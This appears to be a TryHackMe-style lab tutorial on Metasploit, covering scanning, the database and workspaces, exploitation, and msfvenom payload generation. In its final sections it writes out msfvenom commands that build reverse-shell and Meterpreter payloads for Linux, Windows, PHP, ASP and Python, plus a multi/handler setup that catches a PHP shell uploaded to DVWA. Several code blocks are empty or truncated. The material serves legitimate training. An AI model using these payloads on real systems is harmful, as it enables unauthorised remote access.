In this room, we will learn how to use Metasploit for vulnerability scanning and exploitation. We will also cover how the database feature makes it easier to manage penetration testing engagements with a broader scope. Finally, we will look at generating payloads with msfvenom and how to start a Meterpreter session on most target platforms.

More specifically, the topics we will cover are:

- How to scan target systems using Metasploit.
- How to use the Metasploit database feature.
- How to use Metasploit to conduct a vulnerability scan.
- How to use Metasploit to exploit vulnerable services on target systems.
- How `msfvenom` can be used to create payloads and obtain a Meterpreter session on the target system.

Please note that for all questions that require using a wordlist (e.g brute-force attacks), we will be using the wordlist on the AttackBox found at the following path:

`/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt` 

If you opt to use your own machine, please download the wordlist by clicking the Download Task Files button to the right.

# Scanning
## Port Scanning

Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the `search portscan` command.

```
           
msf6 > search portscan

Interact with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner

msf6 >
```

Port scanning modules will require you to set a few options:

```
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) >
```

- **CONCURRENCY:** Number of targets to be scanned simultaneously.
- **PORTS:** Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
- **RHOSTS:** Target or target network to be scanned.
- **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.

You can directly perform Nmap scans from the msfconsole prompt as shown below faster:

```
msf6 > nmap -sS 10.10.12.229
[*] exec: nmap -sS 10.10.12.229

```

As for information gathering, if your engagement requires a speedier approach to port scanning, Metasploit may not be your first choice. However, a number of modules make Metasploit a useful tool for the scanning phase.

## UDP service Identification

The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

```
msf6 auxiliary(scanner/discovery/udp_sweep) > run

[*] Sending 13 probes to 10.10.12.229->10.10.12.229 (1 hosts)
[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :JON-PC::U :WORKGROUP::G :WORKGROUP::U :__MSBROWSE__::G :02:ce:59:27:c8:e3)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/udp_sweep) >
```

## SMB Scans

Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be `smb_enumshares` and `smb_version` but please spend some time to identify scanners that the Metasploit version installed on your system offers.

```
msf6 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.12.229:445      - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) >
```

When performing service scans, it would be important not to omit more "exotic" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).

Remember, Metasploit has many modules that can help you have a better understanding of the target system and possibly help you find vulnerabilities. It is always worth performing a quick search to see if there are any modules that could be helpful based on your target system.

# The Metasploit Database
While it is not required when interacting with a single target on TryHackMe, an actual penetration testing engagement will likely have several targets. 

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values. 

You will first need to start the PostgreSQL database, which Metasploit will use with the following command: 

`systemctl start postgresql`

Then you will need to initialize the Metasploit Database using the `msfdb init` command.

```
           
root@attackbox:~# systemctl start postgresql 
root@attackbox:~# msfdb init
[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract_adapter.rb:84: warning: deprecated Object#=~ is called on Integer; it always returns nil
root@attackbox:~#
```

You can now launch `msfconsole` and check the database status using the `db_status` command.

```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 >
```

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the `workspace` command.

```
msf6 > workspace
* default
msf6 >
```

You can add a workspace using the `-a` parameter or delete a workspace using the `-d` parameter, respectively. The screenshot below shows that a new workspace named "tryhackme" was created.

```
msf6 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme
msf5 > workspace
default
* tryhackme
msf6 >
```

You will also notice that the new database name is printed in red, starting with a `*` symbol.

You can use the workspace command to navigate between workspaces simply by typing `workspace` followed by the desired workspace name.

```
msf6 > workspace
default
* tryhackme
msf5 > workspace default
[*] Workspace: default
msf5 > workspace 
tryhackme
* default
msf6 >
```

You can use the `workspace -h` command to list available options for the `workspace` command.

```
msf6 > workspace -h
Usage:
workspace                  List workspaces
workspace -v               List workspaces verbosely
workspace [name]           Switch workspace
workspace -a [name] ...    Add workspace(s)
workspace -d [name] ...    Delete workspace(s)
workspace -D               Delete all workspaces
workspace -r     Rename workspace
workspace -h               Show this help information
```

Different from regular Metasploit usage, once Metasploit is launched with a database, the `help` command, you will show the Database Backends Commands menu.

```
Database Backend Commands

```

If you run a Nmap scan using the `db_nmap` shown below, all results will be saved to the database.

```
msf6 > db_nmap -sV -p- 10.10.12.229

The `hosts -h` and `services -h` commands can help you become more familiar with available options. 

Once the host information is stored in the database, you can use the `hosts -R` command to add this value to the RHOSTS parameter. 

## Example Workflow

1. We will use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the `use auxiliary/scanner/smb/smb_ms17_010` command.
2. We set the RHOSTS value using `hosts -R`.
3. We have typed `show options` to check if all values were assigned correctly. (In this example, 10.10.138.32 is the IP address we have scanned earlier using the `db_nmap` command)
4. Once all parameters are set, we launch the exploit using the `run` or `exploit` command.

If there is more than one host saved to the database, all IP addresses will be used when the `hosts -R` command is used.   

In a typical penetration testing engagement, we could have the following scenario: 

- Finding available hosts using the `db_nmap` command
- Scanning these for further vulnerabilities or open ports (using a port scanning module) 

The services command used with the `-S` parameter will allow you to search for specific services in the environment.

```

You may want to look for low-hanging fruits such as:

- HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). 
- FTP: Could allow anonymous login and provide access to interesting files. 
- SMB: Could be vulnerable to SMB exploits like MS17-010
- SSH: Could have default or easy to guess credentials
- RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 

As you can see, Metasploit has many features to aid in engagements such as the ability to compartmentalize your engagements into workspaces, analyze your results at a high level, and quickly import and explore data.

# Vulnerability Scanning

Metasploit allows you to quickly identify some critical vulnerabilities that could be considered as “low hanging fruit”.  The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.

Finding vulnerabilities using Metasploit will rely heavily on your ability to scan and fingerprint the target. The better you are at these stages, the more options Metasploit may provide you. For example, if you identify a VNC service running on the target, you may use the `search` function on Metasploit to list useful modules. The results will contain payload and post modules. At this stage, these results are not very useful as we have not discovered a potential exploit to use just yet. However, in the case of VNC, there are several scanner modules that we can use.

```
msf6 > use auxiliary/scanner/vnc/
use auxiliary/scanner/vnc/ard_root_pw    use auxiliary/scanner/vnc/vnc_login      use auxiliary/scanner/vnc/vnc_none_auth
msf6 > use auxiliary/scanner/vnc/
```

Description:
  This module will test a VNC server on a range of machines and report 
  successful logins. Currently it supports RFB protocol version 3.3, 
  3.7, 3.8 and 4.001 using the VNC challenge response authentication 
  method.

As you can see, the `vnc_login` module can help us find login details for the VNC service.

# Exploitation
As the name suggests, Metasploit is an exploitation framework. Exploits are the most populated module category.
```
       =[ metasploit v5.0.101-dev]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post]
+ -- --=[ 562 payloads - 45 encoders - 10 nops]
+ -- --=[ 7 evasion]
```

You can search exploits using the `search` command, obtain more information about the exploit using the `info` command, and launch the exploit using `exploit`. While the process itself is simple, remember that a successful outcome depends on a thorough understanding of services running on the target system.  
  
Most of the exploits will have a preset default payload. However, you can always use the `show payloads` command to list other commands you can use with that specific exploit.

```

Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).

Some payloads will open new parameters that you may need to set, running the `show options` command once more can show these. As you can see in the above example, a reverse payload will at least require you to set the `LHOST` option.

# Msfvenom
Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.  
  
Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

## Output formats

You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The`msfvenom --list formats` command can be used to list supported output formats

## Encoders

Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.

- Generating a php payload:
```

## Handlers

Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the `payload options` title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.

The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;

1. Generate the PHP shell using MSFvenom
2. Start the Metasploit handler
3. Execute the PHP shell  

MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.

- Generating a php reverse shell:
```
           
root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3020 bytes
root@ip-10-0-2-19:~#
```

Please note: The output PHP file will miss the starting PHP tag commented and the end tag (`?>`), as seen below.

The reverse_shell.php file should be edited to convert it into a working PHP file.

We will use Multi Handler to receive the incoming connection. The module can be used with the `use exploit/multi/handler` command.

Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.

To use the module, we will need to set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/reverse_php
payload => php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
lhost => 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
lport => 7777
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.19        yes       The listen address (an interface may be specified)
   LPORT  7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) >
```

Once everything is set, we will `run` the handler and wait for the incoming connection.

```shell-session
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.186.44:7777
```

When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell.

If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.

## Other Payloads

Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:

In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.  
  
Linux Executable and Linkable Format (elf)  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.  
  
Windows  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
  
ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
Python  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`  
  
All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.
